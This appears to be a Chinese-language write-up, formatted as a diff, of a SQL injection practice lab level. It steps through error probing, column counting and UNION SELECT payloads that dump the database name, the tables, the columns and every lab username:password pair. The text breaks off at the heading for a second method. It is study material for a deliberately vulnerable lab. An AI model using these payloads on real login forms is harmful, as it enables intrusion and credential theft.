@@ -1,0 +1,33 @@
+uname='admin&passwd=1234&submit=Submit
+没有报错
+uname="admin&passwd=1234&submit=Submit
+报错' admin") and password=("1234") LIMIT 0,1 '
+故推测sql：select uname,passwd from 表 where uname = ("输入的uname") and password=("输入的passwd") limit 0,1
+
+uname=admin") --+&passwd=1234&submit=Submit
+显示Your Login name:admin<br>Your Password:admin
+
+拆解：
+方法一：
+1.字段数
+uname=admin") order by 2 --+&passwd=1234&submit=Submit
+正常显示
+uname=admin") order by 3 --+&passwd=1234&submit=Submit
+显示：Unknown column '3' in 'order clause'
+说明字段数为2
+2.数据库名
+uname=0") --+&passwd=1234&submit=Submit
+返回为空，说明没有相应记录，于是可以加以利用
+uname=0") union select database(),2 --+&passwd=1234&submit=Submit
+Your Login name:security数据库名为security
+3.表名
+uname=0") union select group_concat(table_name),2 from information_schema.tables where table_schema = database()--+&passwd=1234&submit=Submit
+Your Login name:users,uagents,emails,referers猜测所需的表名为users
+4.字段名
+uname=0") union select group_concat(column_name),2 from information_schema.columns where table_name = 'users'--+&passwd=1234&submit=Submit
+Your Login name:id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS猜测username和password分别对应用户名和密码
+5.字段值
+uname=0") union select group_concat(username,0x3a,password),2 from users--+&passwd=1234&submit=Submit
+Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4
+
+方法二：
